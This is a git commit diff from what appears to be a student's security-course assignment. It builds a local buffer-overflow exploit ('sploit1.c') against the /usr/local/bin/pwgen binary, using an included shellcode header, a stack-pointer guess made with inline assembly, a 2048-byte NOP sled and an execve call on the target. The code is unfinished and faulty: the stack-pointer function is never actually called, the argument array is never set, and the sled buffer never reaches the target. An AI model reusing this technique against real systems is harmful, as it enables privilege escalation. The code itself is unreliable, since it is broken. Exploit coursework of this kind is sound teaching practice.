2ab5085eb16818bddc23714a118c9b98641a933f
Zellccc <gory-killer@hotmail.com>
2018-01-13 15:33:48 -0500

    update test 1
    added NOP.

--- Assignement 1/sploit1.c
+++ Assignement 1/sploit1.c
@@ -5,21 +5,38 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-//#include "/usr/local/src/shellcode.h"
+#include "/usr/local/src/shellcode.h"
 
-//#define TARGET "/usr/local/bin/pwgen"
+#define TARGET "/usr/local/bin/pwgen"
+#define NOP   0x90
+unsigned long get_sp(void){
+__asm__("movl %esp, %eax");
+}
 
 int main(void)
 {
-  char *args[4];
+  char *args[4],*ptr;
+  long addr, *add_ptr;
   char *env[1];
-
+  char buf[2048];
+  //theres a shellcode string
   // one way to invoke pwgen, system() creates a separate process
-  char *buf = 'x00' * 1000 +'\0';
-  //system( + &buf);
-  char[] full = "/usr/local/bin/pwgen -v " + &buf;
+  system("/usr/local/bin/pwgen -v");
 
+  addr = get_sp;
 
+  printf("using address 0x%x...\n",addr);
+  add_ptr = (long *) buf;
+ int i = 0;
+ for(i = 0; i < 2048 ; i ++)
+    buf[i] = NOP;
+
+  env[0] = NULL;
+  // execve() executes the target program by overwriting the
+  // memory of the process in which execve() is executing, i.e.,
+  // execve() should never return
+  if (execve(TARGET, args, env) < 0)
+    fprintf(stderr, "execve failed.\n");
 
   exit(0);
 }
